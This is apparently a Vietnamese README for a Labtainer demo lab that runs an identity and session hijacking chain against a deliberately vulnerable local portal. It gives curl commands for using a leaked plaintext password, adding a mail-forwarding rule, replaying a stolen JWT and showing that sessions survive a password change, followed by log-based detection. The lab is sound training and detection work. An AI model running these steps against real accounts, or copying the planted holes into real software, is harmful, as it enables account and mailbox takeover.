# Lab DEMO: Chuỗi Identity & Session Hijacking (Labtainer)

## Mục đích

Một lab **demo tổng hợp** chạy trọn chuỗi tấn công của DATN trong một lần
`labtainer`:

```
B1 lộ credential  ->  B2 chiếm tài khoản  ->  B3 chiếm hộp thư
                  ->  B4 chiếm JWT/session -> B5 phiên cũ sống sót sau đổi mật khẩu
                  ->  Detection: gom log thành incident
```

Đây là **demo, KHÔNG chấm điểm** (không Result Tag, goals.config,
checkwork, anti-cheat). Bằng chứng là output trên terminal và các dòng
audit log JSONL do portal ghi ra.

## Kiến trúc container

| Container | IP (LAB_NET) | Vai trò |
|---|---|---|
| `victim-portal` | 172.26.0.2 | DATN Portal: FastAPI + SQLite + webmail + JWT API + audit log JSONL |
| `attacker` | 172.26.0.3 | Máy tấn công: terminal chính (curl, jq, python3) + Firefox GUI |
| `victim` | 172.26.0.4 | Nạn nhân user01: script tự đăng nhập hợp lệ tạo baseline |
| `monitor` | 172.26.0.5 | Script Python correlation log → timeline + incident |

- Mạng: `172.26.0.0/24` (đúng chuẩn 3 lab trước), gateway `172.26.0.1`.
- Audit log: `/var/log/datn/app.jsonl` (ngoài `/home`, không bị Labtainer
  dọn khi khởi tạo).
- Không cần VM Windows/Kali; mỗi "máy" là một container.

## Tài khoản seed

| Email | Mật khẩu | Role | Ghi chú |
|---|---|---|---|
| `user01@datn.local` | `Us3r01_DATN!2026` | user | nạn nhân (mật khẩu bị lộ ở B1) |
| `attacker@datn.local` | `Att4ck3r_DATN!2026` | user | tài khoản của người tấn công |
| `admin@datn.local` | `Adm1n_DATN!2026` | admin | seed cho đủ bộ, không dùng trong demo |

> Mật khẩu chứa `!`: trong bash luôn bọc tham số `-d`/`--data-urlencode`
> bằng **nháy đơn** (`'...'`) để tránh history expansion.

## Cách chạy (khuyến nghị: imodule + DockerHub)

```bash
cd ~/labtainer/labtainer-student
imodule https://github.com/Taamne/tamdtt-hijacking/raw/main/web-attk-identity-session-hijacking/imodule_web-attk-identity-session-hijacking.tar
labtainer web-attk-identity-session-hijacking
```

Image publish tại:
`taamne/web-attk-identity-session-hijacking.{attacker,victim-portal,victim,monitor}.student`
(`https://hub.docker.com/u/taamne`).

Cách thủ công (không dùng imodule): copy thư mục `lab/` vào
`~/labtainer/trunk/labs/web-attk-identity-session-hijacking` rồi chạy
`labtainer` như trên (lần đầu sẽ tự build image).

### GUI web bằng Firefox (X11)

Container `attacker` có `X11 YES` và cài Firefox. Labtainer forward X11 ra
host, nên trong terminal attacker gõ:

```bash
firefox http://172.26.0.2:8000 &
```

Một cửa sổ Firefox thật hiện trên màn hình host; đăng nhập user01 và thao
tác profile/mailbox trực quan.

Nếu host **không có X11**: mở `lab/config/start.config`, comment `X11 YES`
và bỏ comment `PUBLISH 127.0.0.1:8000:8000`, rồi dùng trình duyệt của host
mở `http://127.0.0.1:8000`.

## Kịch bản demo 5 bước

Toàn bộ lệnh mẫu nằm trong `lab/attacker/instructions.txt` (được hiển thị
trên terminal attacker khi lab chạy). Tóm tắt:

### B1 — Credential compromise

```bash
curl -s http://172.26.0.2:8000/backup/users.csv
```

File backup cũ do HR sync bỏ quên, chứa mật khẩu plaintext của user01.
Audit: `backup_downloaded` (src_ip=172.26.0.3).

### B2 — Account hijacking

```bash
curl -s -o /dev/null -w '%{http_code}\n' -c /tmp/c.jar \
  -X POST http://172.26.0.2:8000/login \
  --data-urlencode 'username=user01@datn.local' \
  --data-urlencode 'password=Us3r01_DATN!2026'

curl -s -o /dev/null -w '%{http_code}\n' -b /tmp/c.jar -c /tmp/c.jar \
  -X POST http://172.26.0.2:8000/profile \
  --data-urlencode 'phone=+84-900-000-000'
```

Audit: `login_success`, `profile_updated` với `src_ip=172.26.0.3`.

### B3 — Email/mailbox hijacking

```bash
curl -s -b /tmp/c.jar -c /tmp/c.jar -X POST http://172.26.0.2:8000/mail/forward \
  --data-urlencode 'target=attacker@datn.local'

curl -s -b /tmp/c.jar -c /tmp/c.jar -X POST http://172.26.0.2:8000/mail/send \
  --data-urlencode 'to=user01@datn.local' \
  --data-urlencode 'subject=Forward test' \
  --data-urlencode 'body=This message should be forwarded.'
```

Đăng nhập attacker@datn.local và mở inbox để thấy bản `[FWD]`.
Audit: `mailbox_rule_created`, `mail_forwarded`.

### B4 — Token hijacking (JWT replay)

```bash
curl -s http://172.26.0.2:8000/debug/sessions -o /tmp/sessions.json
JWT=$(jq -r '.sessions[] | select(.type=="jwt" and
       .user_id=="user01@datn.local") | .token' /tmp/sessions.json | head -1)

curl -s -H "Authorization: Bearer $JWT" http://172.26.0.2:8000/api/me
curl -s -H "Authorization: Bearer $JWT" http://172.26.0.2:8000/api/mailbox/summary
```

Token do victim xin từ 172.26.0.4, nhưng được replay từ 172.26.0.3 —
không cần đăng nhập lại. Audit: `api_access` cùng `jti`, `replay=true`.

### B5 — Kiểm tra duy trì phiên

Trong terminal **victim** (172.26.0.4):

```bash
cd /home/ubuntu
./change_password_baseline.sh
```

Sau đó quay lại attacker, replay token cũ:

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  -H "Authorization: Bearer $JWT" http://172.26.0.2:8000/api/me
# -> 200
```

Audit: `password_changed` (baseline, `revoked_sessions=0`) rồi `api_access`
của token cũ vẫn thành công. Chạy `./change_password_baseline.sh hardened`
trên lab mới để so sánh (token cũ bị 401).

### Detection (monitor)

Trong terminal **monitor** (172.26.0.5):

```bash
python3 detector/detect.py
```

Kết quả:

- `~/incident/timeline.csv` — timeline toàn bộ event.
- `~/incident/incident_summary.json` — incident gom 3 tín hiệu
  `account_hijack` + `mailbox_hijack` + `token_hijack` (kèm
  `session_not_revoked`, `recon`).

## Audit log

Mỗi dòng JSON tại `/var/log/datn/app.jsonl` có:

```
schema_version, event_id, timestamp (UTC), service, category, event_type,
severity, result, src_ip, user_agent, request_id
```

thêm `user_id`, `jti` cho sự kiện phiên/token, `mailbox`/`rule` cho sự kiện
thư. Log **không** ghi mật khẩu, raw token, Authorization hay cookie.

Các event chính: `login_success`, `login_failed`, `profile_updated`,
`password_changed`, `mail_login`, `mail_read`, `mail_sent`,
`mailbox_rule_created`, `mail_forwarded`, `token_issued`, `api_access`,
`token_rejected`, `debug_sessions_viewed`, `debug_audit_exported`,
`backup_downloaded`.

Xem log:

```bash
# terminal victim-portal
tail -f /var/log/datn/app.jsonl | jq -c \
  '{timestamp,event_type,user_id,src_ip,jti,mailbox,rule,result}'

# hoặc từ attacker (debug endpoint bị quên)
curl -s http://172.26.0.2:8000/debug/audit | tail -n 12 | jq -c .
```

## Reset / dừng

```bash
labtainer -r web-attk-identity-session-hijacking  # làm lại từ đầu
stoplab web-attk-identity-session-hijacking       # dừng lab
```

> **Chuyển sang bài lab khác:** các lab dùng chung mạng lab nội bộ nên
> KHÔNG chạy 2 lab cùng lúc. Dọn lab cũ trước:
> ```bash
> stoplab <tên-lab-cũ>
> docker rm -f $(docker ps -aq --filter "name=web-attk-")
> docker network rm lab_net   # bỏ qua lỗi "has active endpoints" nếu còn lab khác
> labtainer <tên-lab-mới>
> ```

## Nguồn lab

Thư mục `lab/` chứa toàn bộ source Labtainer (`config/`, `dockerfiles/`,
`attacker/`, `victim/`, `victim-portal/`, `monitor/`, `instr_config/`,
`docs/`). Không commit build artifact (`home_tar/`, `sys_tar/`, `*.tar.gz`)
hay log máy local.

## Ghi chú build / publish

- Khi push Docker Hub, tắt containerd image store (hoặc convert bằng
  `skopeo copy --format v2s2`) để manifest là Docker v2 Schema2; nếu không,
  Labtainer cũ báo lỗi **"lacking a base version"**.
- Media type trên Docker Hub phải là
  `application/vnd.docker.distribution.manifest.v2+json`.
- Lab này không có `goals.config`/Result Tag; `instr_config/results.config`
  chỉ chứa comment để Labtainer không lỗi khi stop lab.
